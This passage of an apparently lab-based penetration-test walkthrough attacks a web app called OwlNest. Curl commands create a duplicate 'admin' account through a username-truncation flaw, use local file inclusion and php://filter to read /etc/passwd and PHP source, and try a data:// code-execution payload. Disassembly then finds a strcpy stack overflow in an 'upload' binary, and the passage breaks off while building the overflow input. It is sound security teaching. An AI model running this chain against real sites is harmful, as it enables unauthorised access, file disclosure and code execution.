<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="c1"># Creating admin user fails</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span>http://owlnest.com/register.php
</span><span class="hll">rm -f <span class="nv">$COOKIES</span>
</span>
<span class="hll">curl --silent <span class="se">\</span>
</span>  --data-urlencode <span class="nv">name</span><span class="o">=</span>admin <span class="se">\</span>
  --data-urlencode <span class="nv">surname</span><span class="o">=</span>admin <span class="se">\</span>
  --data-urlencode <span class="nv">email</span><span class="o">=</span>admin@owlnest.com <span class="se">\</span>
<span class="hll">  --data-urlencode <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span> <span class="se">\</span>
</span>  --data-urlencode <span class="nv">password</span><span class="o">=</span>admin <span class="se">\</span>
  --data-urlencode <span class="nv">confirmpwd</span><span class="o">=</span>admin <span class="se">\</span>
  <span class="nv">$URL</span>
<span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># Username Already Exists</span>
</span>
<span class="hll"><span class="c1"># Create hacker id with password &quot;hacker&quot;</span>
</span>curl --silent <span class="se">\</span>
  --data-urlencode <span class="nv">name</span><span class="o">=</span>hacker <span class="se">\</span>
  --data-urlencode <span class="nv">surname</span><span class="o">=</span>hacker <span class="se">\</span>
  --data-urlencode <span class="nv">email</span><span class="o">=</span>hacker@owlnest.com <span class="se">\</span>
<span class="hll">  --data-urlencode <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;hacker&quot;</span> <span class="se">\</span>
</span>  --data-urlencode <span class="nv">password</span><span class="o">=</span>hacker <span class="se">\</span>
  --data-urlencode <span class="nv">confirmpwd</span><span class="o">=</span>hacker <span class="se">\</span>
  <span class="nv">$URL</span>
<span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># Registration completed successfully</span>
</span><span class="hll"><span class="c1"># For future reference, to create a second &quot;admin&quot;:</span>
</span><span class="hll"><span class="c1">#   make ID longer than 16 characters</span>
</span><span class="hll"><span class="c1">#   --data-urlencode username=&quot;admin           1&quot;</span>
</span>
<span class="hll"><span class="c1"># Now log in using hacker/hacker</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/login.php&#39;</span>
</span><span class="hll">curl --silent --cookie-jar <span class="nv">$COOKIES</span> <span class="se">\</span>
</span><span class="hll">  --data-urlencode <span class="s2">&quot;username=hacker&quot;</span> <span class="se">\</span>
</span><span class="hll">  --data-urlencode <span class="s2">&quot;password=hacker&quot;</span> <span class="se">\</span>
</span><span class="hll">  <span class="nv">$URL</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># Successfully Logged in</span>
</span>
<span class="hll"><span class="c1"># Show cookies</span>
</span><span class="hll">cat <span class="nv">$COOKIES</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># PHPSESSID=n9mrsaun6a17ipv32sac5acvs7</span>
</span></pre></div>
</div>
</div>
<div class="section" id="the-upload-url">
<h4>3.2.2.5.3. The upload URL<a class="headerlink" href="#the-upload-url" title="Permalink to this headline">¶</a></h4>
<p>At this point trying the <a class="reference external" href="http://owlnest.com/uploadform.php?page=forms/form.php">Upload</a> link gets a message <em>The administrator has configured access restrictions for this page, only the user “admin” is allowed to view it.</em> But investigating the link <a class="reference external" href="http://owlnest.com/uploadform.php?page=forms/form.php">http://owlnest.com/uploadform.php?page=forms/form.php</a> leads one to wonder if LFI (local file inclusion) is possible:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">curl --location --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
</span><span class="hll">    http://owlnest.com/uploadform.php?page<span class="o">=</span>/etc/passwd
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># The administrator has configured access restrictions for this page,</span>
</span><span class="hll"><span class="c1"># only the user &quot;admin&quot; is allowed to view it.</span>
</span></pre></div>
</div>
<p>Nothing here without being “admin”.</p>
</div>
<div class="section" id="oh-to-be-admin">
<h4>3.2.2.5.4. Oh to be admin<a class="headerlink" href="#oh-to-be-admin" title="Permalink to this headline">¶</a></h4>
<p>Most systems have both textual and internal names for a user, like “root” and UID 0 in Linux. The internal name is what matters. But here they want a user with textual name “admin”. It would seem we’re reduced to guessing admin’s password. But a flaw in the registration allows creating a second admin user by exploiting the 16 character limit in <a class="reference external" href="http://owlnest.com/register_form.php">Owlnest Registration</a>. Make a 17 byte username consisting of “admin” followed by 11 spaces followed by “1” (using <strong class="program">curl</strong> or <a class="reference external" href="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/">Tamper Data</a> to avoid the 16 byte form limit). When the 17 byte username is compared to the existing “admin” it’s not the same and so is created (but probably only the first 16 bytes are stored). So now we have 2 “admin” accounts with different passwords.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="nv">URL</span><span class="o">=</span>http://owlnest.com/register.php
</span><span class="hll"><span class="nv">COOKIES</span><span class="o">=</span>cookies.txt
</span><span class="hll">rm -f <span class="nv">$COOKIES</span>
</span>
<span class="hll">curl --silent <span class="se">\</span>
</span>  --data-urlencode <span class="nv">name</span><span class="o">=</span>admin <span class="se">\</span>
  --data-urlencode <span class="nv">surname</span><span class="o">=</span>admin <span class="se">\</span>
  --data-urlencode <span class="nv">email</span><span class="o">=</span>admin@owlnest.com <span class="se">\</span>
<span class="hll">  --data-urlencode <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;admin           1&quot;</span> <span class="se">\</span>
</span>  --data-urlencode <span class="nv">password</span><span class="o">=</span>admin <span class="se">\</span>
  --data-urlencode <span class="nv">confirmpwd</span><span class="o">=</span>admin <span class="se">\</span>
  <span class="nv">$URL</span>
<span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># Registration completed successfully</span>
</span>
<span class="hll"><span class="c1"># Now log in using admin/admin</span>
</span><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/login.php&#39;</span>
curl --silent --cookie-jar <span class="nv">$COOKIES</span> <span class="se">\</span>
  --data-urlencode <span class="s2">&quot;username=admin&quot;</span> <span class="se">\</span>
  --data-urlencode <span class="s2">&quot;password=admin&quot;</span> <span class="se">\</span>
  <span class="nv">$URL</span>
<span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># Successfully Logged in</span>
</span>
<span class="hll"><span class="c1"># Show cookies</span>
</span><span class="hll">cat <span class="nv">$COOKIES</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># PHPSESSID=sr43ht67im4ui4gi2airvvbar0</span>
</span></pre></div>
</div>
<p>LFI works with “admin”:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll">curl --location --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
</span><span class="hll">    http://owlnest.com/uploadform.php?page<span class="o">=</span>/etc/passwd
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># rmp:x:1000:1000:rmp,,,:/home/rmp:/bin/bash</span>
</span><span class="hll">curl --location --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
</span><span class="hll">    http://owlnest.com/uploadform.php?page<span class="o">=</span>/etc/group
</span><span class="hll"><span class="c1"># results in nothing interesting</span>
</span></pre></div>
</div>
<p>We see the local Linux user “rmp” which will be used later.</p>
</div>
<div class="section" id="reconnaissance-via-lfi-and-php-protocol-php-filter">
<h4>3.2.2.5.5. Reconnaissance via LFI and PHP protocol php://filter/<a class="headerlink" href="#reconnaissance-via-lfi-and-php-protocol-php-filter" title="Permalink to this headline">¶</a></h4>
<p>So the “admin” user gives us LFI for reconnaissance. We want to snoop around for both PHP and non-PHP files. As seen above with <code class="file docutils literal notranslate"><span class="pre">/etc/passwd</span></code>, non-PHP files can easily be downloaded, but there’s an alternative using one of the PHP protocols “<a class="reference external" href="file://">file://</a>”:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="c1"># This works</span>
curl --location --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
    http://owlnest.com/uploadform.php?page<span class="o">=</span>/etc/group
<span class="hll"><span class="c1"># But using the file:// protocol also works:</span>
</span><span class="hll">curl --location --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
</span><span class="hll">    http://owlnest.com/uploadform.php?page<span class="o">=</span>file:///etc/group
</span></pre></div>
</div>
<p>There are other protocols besides “<a class="reference external" href="file://">file://</a>”. Another is “<a class="reference external" href="data://">data://</a>” where if it were enabled here we could upload data:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl --location --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
    http://owlnest.com/uploadform.php?page<span class="o">=</span>data://&lt;?php+passthru<span class="o">(</span>id<span class="o">)</span><span class="p">;</span>+?&gt;
</pre></div>
</div>
<p>But unfortunately that would get the error message <em>data:// wrapper is disabled in the server configuration by allow_url_include=0</em>.</p>
<p>However, the PHP protocol “php://filter/” is enabled and will allow us to download PHP files, instead of executing them. From the list of all PHP <a class="reference external" href="http://in.php.net/wrappers.php">Supported Protocols and Wrappers</a> we only need the <a class="reference external" href="http://in.php.net/manual/en/wrappers.php.php">php://</a> protocol, within that the <code class="docutils literal notranslate"><span class="pre">php://filter</span></code> wrapper, and within the <a class="reference external" href="http://in.php.net/manual/en/filters.php">List of Available Filters</a> we only need <a class="reference external" href="http://in.php.net/manual/en/function.base64-encode.php">base64_encode</a> from the <a class="reference external" href="http://in.php.net/manual/en/filters.convert.php">Conversion Filters</a>. The idea is to base64-encode a PHP file so it’s no longer PHP but something to be downloaded.</p>
<p>Let’s take a look at <code class="file docutils literal notranslate"><span class="pre">uploadform.php</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/uploadform.php&#39;</span>
</span><span class="hll"><span class="nv">PHP</span><span class="o">=</span>uploadform.php
</span><span class="hll">curl --silent --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
</span><span class="hll">  <span class="nv">$URL</span>?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span><span class="nv">$PHP</span> <span class="se">\</span>
</span><span class="hll">  <span class="p">|</span> base64 -d -w <span class="m">0</span> <span class="se">\</span>
</span><span class="hll">  <span class="p">|</span> tee <span class="nv">$PHP</span>
</span></pre></div>
</div>
<p><code class="file docutils literal notranslate"><span class="pre">uploadform.php</span></code> source is:</p>
<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;includes/config_inc.php&quot;</span><span class="p">);</span>

        <span class="nb">session_start</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;loggedin&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;loggedin&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="k">true</span> <span class="o">&amp;&amp;</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$loggedinas</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]));</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;location: /error.php&quot;</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span>

  <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]);</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>More LFI of both PHP and non-PHP files does not lead to a ready exploit.</p>
</div>
</div>
</div>
<div class="section" id="the-exploit">
<h2>3.2.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
<p>On a side note, if you use <strong class="program">curl</strong> and dawdle, you may periodically have to log in again. Here goes a code snippet you can cut-&amp;-paste to log back in as “admin”:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="c1"># Now log in using admin/admin</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/login.php&#39;</span>
</span><span class="hll">curl --silent --cookie-jar <span class="nv">$COOKIES</span> <span class="se">\</span>
</span><span class="hll">  --data-urlencode <span class="s2">&quot;username=admin&quot;</span> <span class="se">\</span>
</span><span class="hll">  --data-urlencode <span class="s2">&quot;password=admin&quot;</span> <span class="se">\</span>
</span><span class="hll">  <span class="nv">$URL</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># Successfully Logged in</span>
</span></pre></div>
</div>
<div class="section" id="exploit-upload-binary">
<h3>3.2.3.1. Exploit <code class="file docutils literal notranslate"><span class="pre">upload</span></code> binary<a class="headerlink" href="#exploit-upload-binary" title="Permalink to this headline">¶</a></h3>
<div class="section" id="download-upload">
<h4>3.2.3.1.1. Download <code class="file docutils literal notranslate"><span class="pre">upload</span></code><a class="headerlink" href="#download-upload" title="Permalink to this headline">¶</a></h4>
<p>We return to <code class="file docutils literal notranslate"><span class="pre">application/upload</span></code> and download it and discover it’s an ELF executable:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/uploadform.php&#39;</span>
<span class="hll"><span class="nv">APP</span><span class="o">=</span>application/upload
</span><span class="hll"><span class="nv">FILE</span><span class="o">=</span>upload
</span>curl --silent --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
<span class="hll">  <span class="nv">$URL</span>?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span><span class="nv">$APP</span> <span class="se">\</span>
</span><span class="hll">  <span class="p">|</span> base64 -d -w <span class="m">0</span> &gt; <span class="nv">$FILE</span>
</span>
<span class="hll">file upload
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># upload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=c7d8af817263847d46ff91b7517e804674a970b2, not stripped</span>
</span></pre></div>
</div>
</div>
<div class="section" id="analyze-upload">
<h4>3.2.3.1.2. Analyze <code class="file docutils literal notranslate"><span class="pre">upload</span></code><a class="headerlink" href="#analyze-upload" title="Permalink to this headline">¶</a></h4>
<p>First a basic analysis of the statically linked <code class="file docutils literal notranslate"><span class="pre">upload</span></code> ELF (see <a class="reference external" href="https://securityblog.redhat.com/2014/03/26/fortify-and-you/">Enhance application security with FORTIFY_SOURCE</a>). It has little to no security, allowing plain shellcode to be execute on the stack. Here we exercise a number of binutils utilities to look at <code class="file docutils literal notranslate"><span class="pre">upload</span></code>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="nv">P</span><span class="o">=</span>upload
</span><span class="hll">objdump -s --section .comment <span class="nv">$P</span>    <span class="c1"># compiler?</span>
</span><span class="hll">ldd <span class="nv">$P</span>    <span class="c1"># statically linked</span>
</span><span class="hll">readelf --segments <span class="nv">$P</span>    <span class="c1"># ELF segments</span>
</span><span class="hll">readelf --sections <span class="nv">$P</span>    <span class="c1"># ELF sections (contained in segments)</span>
</span><span class="c1"># Download checksec</span>
curl --silent --remote-name <span class="se">\</span>
    https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec
chmod +x checksec
<span class="hll">./checksec --file <span class="nv">$P</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># No RELRO, No canary found, NX disabled, No PIE, No RPATH, No RUNPATH, FORTIFY Yes</span>
</span><span class="hll">./checksec --fortify-file <span class="nv">$P</span>
</span><span class="hll"><span class="c1"># results in</span>
</span><span class="hll"><span class="c1"># 4/58 FORTIFIED syslog_chk, vfprintf_chk, vfprintf_chk, vsyslog_chk</span>
</span>
<span class="hll"><span class="c1"># Get a smallish list of 83 symbols for analysis</span>
</span><span class="hll">nm -g <span class="nv">$P</span> <span class="p">|</span> grep -v <span class="s1">&#39; _&#39;</span> <span class="p">|</span> grep <span class="s1">&#39; T &#39;</span> <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f3 <span class="se">\</span>
</span><span class="hll">    <span class="p">|</span> sort <span class="p">|</span> tee <span class="si">${</span><span class="nv">P</span><span class="si">}</span>_symbols.txt
</span><span class="hll"><span class="c1"># show libc version on Kali</span>
</span><span class="hll">ldd --version
</span><span class="hll"><span class="c1"># results in 2.19</span>
</span><span class="hll"><span class="c1"># Get symbols in 32 bit libc</span>
</span><span class="hll">nm -D /lib32/libc-2.19.so <span class="p">|</span> grep -v <span class="s1">&#39; _&#39;</span> <span class="p">|</span> grep <span class="s1">&#39; T &#39;</span> <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f3 <span class="se">\</span>
</span><span class="hll">    <span class="p">|</span> sort <span class="p">|</span> tee <span class="si">${</span><span class="nv">P</span><span class="si">}</span>_libc.txt
</span><span class="hll"><span class="c1"># List symbols only in $P</span>
</span><span class="hll">comm -23 upload_symbols.txt upload_libc.txt &gt; upload_uniq.txt
</span><span class="hll"><span class="c1"># results in 38 routines</span>
</span></pre></div>
</div>
<p>That last bit of <code class="docutils literal notranslate"><span class="pre">nm</span></code> and <code class="docutils literal notranslate"><span class="pre">comm</span></code> magic left us with the symbols in <code class="file docutils literal notranslate"><span class="pre">upload</span></code> not in libc. Of the 38 routines left, 20 are CGI_* which look to be from <a class="reference external" href="http://www.boutell.com/cgic/">cgic: an ANSI C library for CGI Programming</a> with source code hosted at github <a class="reference external" href="https://github.com/boutell/cgic">boutell/cgic</a>. Of the 18 remaining, the only ones not C/C++ were “main” and “validateEmail”. Unless we’re going after known library bugs, we can concentrate our efforts on “main” and “validateEmail”. And since “validateEmail” is much smaller, we’ll start with that one.</p>
</div>
<div class="section" id="disassemble-upload">
<h4>3.2.3.1.3. Disassemble <code class="file docutils literal notranslate"><span class="pre">upload</span></code><a class="headerlink" href="#disassemble-upload" title="Permalink to this headline">¶</a></h4>
<p>To scan for possibly vulnerable code we can look at the dissassembled code, concentrating first on “validateEmail”:</p>
<div class="highlight-objdump notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="x"># validateEmail uses address 0x80ae908 so see that it&#39;s &quot;@&quot;</span>
</span><span class="hll"><span class="x">gdb -batch -ex &#39;file upload&#39; -ex &#39;x/s 0x80ae908&#39;</span>
</span><span class="hll"><span class="x"># results in</span>
</span><span class="hll"><span class="x"># 0x80ae908:  &quot;@&quot;</span>
</span><span class="hll"><span class="x">gdb -batch -ex &#39;file upload&#39; -ex &#39;disassemble validateEmail&#39;</span>
</span><span class="hll"><span class="x"># ARG1, ... is for validateEmail args</span>
</span><span class="hll"><span class="x"># arg1, ... is for called routine args</span>
</span><span class="x">Dump of assembler code for function validateEmail:</span>
<span class="x">   0x08048254 &lt;+0&gt;:   push   ebp</span>
<span class="x">   0x08048255 &lt;+1&gt;:   mov    ebp,esp                        # save caller ebp</span>
<span class="x">   0x08048257 &lt;+3&gt;:   sub    esp,0x128                      # 296 byte stack</span>
<span class="x">   0x0804825d &lt;+9&gt;:   mov    eax,DWORD PTR [ebp+0x8]        # arg1=ARG1</span>
<span class="x">   0x08048260 &lt;+12&gt;:  mov    DWORD PTR [esp],eax            #</span>
<span class="x">   0x08048263 &lt;+15&gt;:  call   0x8059080 &lt;strlen&gt;             # strlen(arg1)</span>
<span class="x">   0x08048268 &lt;+20&gt;:  add    eax,0x1                        # eax = strlen+1</span>
<span class="x">   0x0804826b &lt;+23&gt;:  mov    DWORD PTR [esp],eax            # arg1 = strlen+1</span>
<span class="x">   0x0804826e &lt;+26&gt;:  call   0x80575c0 &lt;malloc&gt;             # malloc(arg1)</span>
<span class="x">   0x08048273 &lt;+31&gt;:  mov    DWORD PTR [ebp-0xc],eax        # save malloc</span>
<span class="x">   0x08048276 &lt;+34&gt;:  mov    eax,DWORD PTR [ebp+0x8]        # arg2=ARG1</span>
<span class="x">   0x08048279 &lt;+37&gt;:  mov    DWORD PTR [esp+0x4],eax        #</span>
<span class="x">   0x0804827d &lt;+41&gt;:  mov    eax,DWORD PTR [ebp-0xc]        # arg1=malloc</span>
<span class="x">   0x08048280 &lt;+44&gt;:  mov    DWORD PTR [esp],eax            #</span>
<span class="x">   0x08048283 &lt;+47&gt;:  call   0x8059050 &lt;strcpy&gt;             # strcpy(malloc,ARG1)</span>
<span class="x">   0x08048288 &lt;+52&gt;:  mov    DWORD PTR [esp+0x4],0x80ae908  # arg2=&quot;@&quot;</span>
<span class="x">   0x08048290 &lt;+60&gt;:  mov    eax,DWORD PTR [ebp-0xc]        # arg1=malloc</span>
<span class="x">   0x08048293 &lt;+63&gt;:  mov    DWORD PTR [esp],eax            #</span>
<span class="x">   0x08048296 &lt;+66&gt;:  call   0x8059c40 &lt;strtok&gt;             # strtok(malloc,&quot;@&quot;)</span>
<span class="x">   0x0804829b &lt;+71&gt;:  mov    DWORD PTR [ebp-0x10],eax       # save strtok PTR</span>
<span class="x">   0x0804829e &lt;+74&gt;:  mov    DWORD PTR [esp+0x4],0x80ae908  # arg2=&quot;@&quot;</span>
<span class="x">   0x080482a6 &lt;+82&gt;:  mov    DWORD PTR [esp],0x0            # arg1=0x0</span>
<span class="x">   0x080482ad &lt;+89&gt;:  call   0x8059c40 &lt;strtok&gt;             # strtok(0x0,&quot;@&quot;)</span>
<span class="x">   0x080482b2 &lt;+94&gt;:  mov    DWORD PTR [ebp-0x10],eax       # save strtok PTR</span>

<span class="x">   0x080482b5 &lt;+97&gt;:  cmp    DWORD PTR [ebp-0x10],0x0       # last strtok = 0x0?</span>
<span class="x">   0x080482b9 &lt;+101&gt;: je     0x80482d0 &lt;validateEmail+124&gt;  # yes - skip</span>
<span class="x">   0x080482bb &lt;+103&gt;: mov    eax,DWORD PTR [ebp-0x10]       # no - arg2=strtok PTR</span>
<span class="x">   0x080482be &lt;+106&gt;: mov    DWORD PTR [esp+0x4],eax        #</span>
<span class="x">   0x080482c2 &lt;+110&gt;: lea    eax,[ebp-0x110]                # no - arg1=272 bytes</span>
<span class="x">   0x080482c8 &lt;+116&gt;: mov    DWORD PTR [esp],eax            #      from stack top</span>
<span class="hll"><span class="x">   0x080482cb &lt;+119&gt;: call   0x8059050 &lt;strcpy&gt;             # strcpy(STACK,strtok PTR)</span>
</span><span class="hll"><span class="x">                                                            #   STACK OVERFLOW HERE</span>
</span><span class="x">   0x080482d0 &lt;+124&gt;: mov    eax,0x0                        # return 0</span>
<span class="x">   0x080482d5 &lt;+129&gt;: leave</span>
<span class="x">   0x080482d6 &lt;+130&gt;: ret</span>
</pre></div>
</div>
<p>We could paraphrase this code as:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">validateEmail</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">email</span><span class="p">)</span>
  <span class="c1">// allocate buffer big enough for email copy</span>
  <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">email</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">email</span><span class="p">)</span>
  <span class="c1">// Find string before &quot;@&quot; in email</span>
  <span class="n">user</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;@&quot;</span><span class="p">)</span>
  <span class="c1">// Find string after &quot;@&quot;</span>
  <span class="n">domain</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="s">&quot;@&quot;</span><span class="p">)</span>
<span class="hll">  <span class="c1">// if domain exists make a useless copy in the stack</span>
</span><span class="hll">  <span class="c1">//   which will overflow if bigger than 272 bytes</span>
</span><span class="hll">  <span class="k">if</span> <span class="p">(</span><span class="n">domain</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span><span class="hll">    <span class="n">strcpy</span><span class="p">(</span><span class="n">PTR_272_BYTES_INTO_STACK</span><span class="p">,</span> <span class="n">domain</span><span class="p">)</span>
</span><span class="hll">  <span class="p">}</span>
</span></pre></div>
</div>
<p>That last <code class="docutils literal notranslate"><span class="pre">strcpy</span></code> is useless and overflows the stack. But we wouldn’t have an exploit without it. So the first 272 bytes of the email’s domain fills up the stack, the next 4 bytes clobbers the saved caller’s ebp pointer, and the next 4 overwrite the return address.</p>
</div>
<div class="section" id="running-upload-on-the-command-line">
<h4>3.2.3.1.4. Running <code class="file docutils literal notranslate"><span class="pre">upload</span></code> on the command line<a class="headerlink" href="#running-upload-on-the-command-line" title="Permalink to this headline">¶</a></h4>
<p>If you look at the Tamper Data capture of the form in <a class="reference external" href="http://owlnest.com/uploadform.php?page=forms/form.php">The OwlNest Upload</a>, it specifies “Content-Type” and “POSTDATA”. How does <a class="reference external" href="https://github.com/boutell/cgic/blob/master/cgic.c">cgic.c</a> get those data? For “Content-Type” via <code class="docutils literal notranslate"><span class="pre">e</span> <span class="pre">=</span> <span class="pre">getenv(&quot;CONTENT_TYPE&quot;);</span></code> which fetches the environment variable CONTENT_TYPE. That specifies the boundary between fields in the “multipart/form-data”, allowing CGI to parse the posted form. The “POSTDATA” is read from STDIN, as seen from the line <code class="docutils literal notranslate"><span class="pre">cgiIn</span> <span class="pre">=</span> <span class="pre">stdin;</span></code> and numerous <code class="docutils literal notranslate"><span class="pre">fread(,,,cgiIn)</span></code> reads.</p>
<p>File uploads are stored in <code class="file docutils literal notranslate"><span class="pre">/var/www/images/</span></code>. Putting this all together, to run <code class="file docutils literal notranslate"><span class="pre">upload</span></code> from the command line using a domain large enough to overflow the buffer and overwrite the return address with “BBBB”:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="c1"># /var/www not exist on my machine</span>
</span><span class="hll">ls -ld /var/www
</span><span class="hll"><span class="c1"># So create /var/www/images for my user</span>
</span><span class="hll"><span class="nv">$SUDO</span> mkdir -p /var/www/images
</span><span class="hll"><span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> /var/www/images
</span>
<span class="hll"><span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s1">&#39;multipart/form-data; boundary=---------------------------1802089588215914701439635166&#39;</span> ./upload &lt; request.txt
</span><span class="hll"><span class="nv">FILENAME</span><span class="o">=</span><span class="s1">&#39;foo.txt&#39;</span>
</span><span class="hll"><span class="nv">DOMAIN</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*276 + &quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class="hll">cat &gt; request.txt <span class="s">&lt;&lt;EOF</span>
</span><span class="s">-----------------------------1802089588215914701439635166</span>
<span class="s">Content-Disposition: form-data; name=&quot;name&quot;</span>

<span class="s">name</span>
<span class="s">-----------------------------1802089588215914701439635166</span>
<span class="s">Content-Disposition: form-data; name=&quot;email&quot;</span>

<span class="hll"><span class="s">user@$DOMAIN</span>
